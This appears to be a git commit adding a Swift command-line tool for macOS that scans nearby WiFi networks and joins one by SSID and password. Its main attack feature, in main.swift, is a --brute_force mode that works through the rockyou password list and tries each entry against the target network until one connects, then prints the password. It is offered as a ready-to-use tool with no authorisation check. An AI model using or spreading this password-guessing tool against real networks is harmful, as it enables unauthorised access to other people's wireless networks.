c656dc42c5b5bf5151cc028a267f6a78acafc57c
Maximilian Springenberg <maxi@mb-pro-10.local>
2018-11-25 12:58:08 +0100

    wifi script

---
+++ wifi_script/wifi_script/main.swift
@@ -0,0 +1,88 @@
+#!/usr/bin/swift
+//  main.swift
+//  wifi_script
+//
+//  Created by Maximilian Springenberg
+//  Copyright © 2018 Maximilian Springenberg. All rights reserved.
+import Foundation
+import CoreWLAN
+
+
+//overhead
+//========
+
+var pw : String?
+var ssid : String?
+var bf = false
+var ls = false
+
+
+//args parsing
+//============
+
+for arg in CommandLine.arguments[1..<CommandLine.arguments.endIndex]{
+    
+    // password
+    if(arg.starts(with: "--pw=")){
+        pw = arg.split(separator: "=")[1...].joined(separator: "")
+        
+    // listing networks
+    }else if(arg.starts(with: "--ls")){
+        ls = true
+        
+    // ssid of network that ought to be connected to
+    }else if(arg.starts(with: "--ssid=")){
+        ssid = arg.split(separator: "=")[1...].joined(separator: "")
+        
+    // brute force approach if no password has been submitted
+    }else if(arg == "--brute_force"){
+        bf = true;
+    }
+    
+}
+
+
+//performing connection and output
+//================================
+
+// listing networks
+if(ls), let scanner = NetworkScanner() {
+    for network in scanner.networks {
+        print("\(network.ssid!)")
+        print("\(network)")
+        print("\n")
+    }
+}
+
+// ssid has to be valid for a connection
+if ssid != nil, let scanner = NetworkScanner(), let network = scanner.getNetwork(withSSID: ssid!) {
+    
+    // connecting with passowrd
+    if pw != nil {
+        do{
+            try scanner.currentInterface.associate(to: network, password: pw!)
+        }catch let error as NSError {
+            print("could not connect to \(ssid!)")
+            print("ERROR: \(error.localizedDescription)")
+        }
+        
+    // brute-force approach
+    }else if bf{
+        if let rockYou = TxtDataLoader(forResource: "rockyou"), let scanner = NetworkScanner(){
+            
+            // trying passwords from dictionary
+            for pw in rockYou.lines{
+                do{
+                    try scanner.currentInterface.associate(to: network, password: String(pw))
+                    // did not fail -> correct password
+                    print("Connected to \(ssid!) with password \(pw)")
+                    break
+                } catch{
+                    // failed -> wrong password
+                }
+            }
+            
+        }
+    }
+    
+}
---
+++ wifi_script/wifi_script/util.swift
@@ -0,0 +1,72 @@
+//  util.swift
+//  wifi_script
+//
+//  Created by Maximilian Springenberg
+//  Copyright © 2018 Maximilian Springenberg. All rights reserved.
+import Foundation
+import CoreWLAN
+
+
+// scanner for networks
+class NetworkScanner {
+    var currentInterface: CWInterface
+    var interfacesNames: [String] = []
+    var networks: Set<CWNetwork> = []
+    var client: CWWiFiClient = CWWiFiClient()
+    
+    // setting the interface automatically, can fail
+    init?() {
+        if let defaultInterface = CWWiFiClient.shared().interface(),
+            let name = defaultInterface.interfaceName {
+            self.currentInterface = defaultInterface
+            self.interfacesNames.append(name)
+            self.findNetworks()
+        } else {
+            return nil
+        }
+    }
+    
+    // setting the interface with the literal interface name (the likes of "en1")
+    init(name: String) {
+        self.currentInterface = self.client.interface(withName:name)!
+        self.interfacesNames.append(name)
+        self.findNetworks()
+    }
+    
+    // fetching detectable WIFI networks
+    func findNetworks() {
+        do {
+            self.networks = try currentInterface.scanForNetworks(withSSID:nil)
+        } catch let error as NSError {
+            print("ERROR: \(error.localizedDescription)")
+        }
+    }
+    
+    // fetching specific Network
+    func getNetwork(withSSID: String) -> CWNetwork? {
+        for network in self.networks{
+            if ssid == network.ssid{
+                return network
+            }
+        }
+        return nil
+    }
+}
+
+
+// easy access to lines in .txt files
+class TxtDataLoader{
+    var filePath : String
+    var lines : Array<Substring>
+    
+    // trying to load the file, can fail
+    init?(forResource: String){
+        self.filePath = Bundle.main.path(forResource: forResource, ofType: "txt")!
+        do{
+            let content = try String(contentsOfFile: self.filePath)
+            lines = content.split(separator: "\n")
+        }catch{
+            return nil
+        }
+    }
+}
